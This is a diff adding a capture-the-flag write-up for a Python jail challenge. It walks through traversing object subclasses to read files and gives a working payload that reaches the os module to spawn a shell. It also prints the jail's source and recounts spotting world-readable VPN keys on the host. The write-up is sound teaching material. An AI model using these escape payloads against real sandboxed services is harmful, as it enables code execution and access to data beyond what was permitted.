@@ -190,3 +190,66 @@ print a
 </code></pre>
 
 <p>The password we extracted by this method was <code>S@nd_will2z0</code>, and providing this as the password returns the flag <code>Time_works_for_you</code>. Perhaps a timing attack was the intended solution?</p>
+
+<h2>Exploits 300</h2>
+
+<p>We're challenged to escape a jail, and a few first submissions return Python-style errors. </p>
+
+<p>Apart from missing builtins, there appear to be no restrictions on input characters, so we don't need any encoding tricks. </p>
+
+<p>In a local interpreter I tried to find a reference to <code>os</code> so I could open a shell. We can start by listing the subclasses of <code>object</code>:</p>
+
+<pre><code>&gt;&gt;&gt; object.__subclasses__()
+[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'posix.stat_result'&gt;, &lt;type 'posix.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;]
+</code></pre>
+
+<p>To reach <code>object</code> in the challenge, it was necessary to follow the class hierarchy from any object, like a number or tuple. We can instantiate a file object and read it:</p>
+
+<pre><code>&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]
+&lt;type 'file'&gt;
+&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]('filename.txt','r').read()
+</code></pre>
+
+<p>Then, we tried reading <code>flag</code>, <code>key</code>, <code>flag.txt</code> and so on, none of which were found. Then, we noticed that we had an absolute path to <code>exploit300.py</code> (<code>/home/john/exploit300.py</code>) in the traceback when EOF is sent. So, we read that absolute path and retrieved the script, included farther below. As suspected, though the builtins are empty, there are no restrictions on input. Now we need to get a shell. <a href="http://eindbazen.net/2013/04/pctf-2013-pyjail-misc-400/">Eindbazen's pCTF pyjail solution</a> used the same trick to get a list of classes, and then indexed into it to traverse to the <code>os</code> module: </p>
+
+<pre><code>().__class__.__bases__[0].__subclasses__()[48].__init__.__globals__['linecache'].os.execlp('sh','')
+</code></pre>
+
+<p>However, this was running in a different Python environment, so it wasn't clear what the class at index 48 was supposed to be. I checked a few numbers around it and found that 52, <code>warningmessage</code>, worked.</p>
+
+<pre><code>().__class__.__bases__[0].__subclasses__()[52].__init__.__globals__['linecache'].os.execlp('sh','')
+</code></pre>
+
+<p>Now we had a shell, and in the root directory, which is why <code>flag.txt</code> was not found. The flag was located at <code>/home/john/flag.txt</code>. We should have checked that path earlier.</p>
+
+<p>Having solved the problem, we explored the system a bit and found some world-readable VPN configuration files and client keys(!) in <code>/ov/oooooo</code>. We also discovered that flag.txt and exploit300.py were writable by the <code>john</code> user. Though tempting, we didn't modify either. In short, this wasn't much of a sandbox.</p>
+
+<p>When trying to find the pyjail solution we referenced, we came across a writeup for picoCTF's Python Eval 5, and discovered that this problem was identical down to the indentation style, apart from a comment, the prompt text, and the allowed length:</p>
+
+<pre><code>#!/usr/bin/python -u                            | from sys import modules
+# task5.py                                      | modules.clear()
+# A real challenge for those python masters out | del modules
+                                                |
+from sys import modules                         | _raw_input = raw_input
+modules.clear()                                 | _BaseException = BaseException
+del modules                                     | _EOFError = EOFError
+                                                |
+_raw_input = raw_input                          | # he-he
+_BaseException = BaseException                  | __builtins__.__dict__.clear()
+_EOFError = EOFError                            | __builtins__ = None
+                                                |
+__builtins__.__dict__.clear()                   | print '&gt;&gt;&gt; Just escape me...'
+__builtins__ = None                             |
+                                                | while 1:
+print 'Get a shell, if you can...'              |   try:
+                                                |     d = {'x':None}
+while 1:                                        |     exec 'x='+_raw_input()[:500] in d
+  try:                                          |     print 'ret:', d['x']
+    d = {'x':None}                              |   except _EOFError, e:
+    exec 'x='+_raw_input()[:50] in d            |     raise e
+    print 'Return Value:', d['x']               |   except _BaseException, e:
+  except _EOFError, e:                          /     print 'Exception:', e
+    raise e                                     &lt;
+  except _BaseException, e:                     &lt;
+    print 'Exception:', e                       &lt;
+</code></pre>
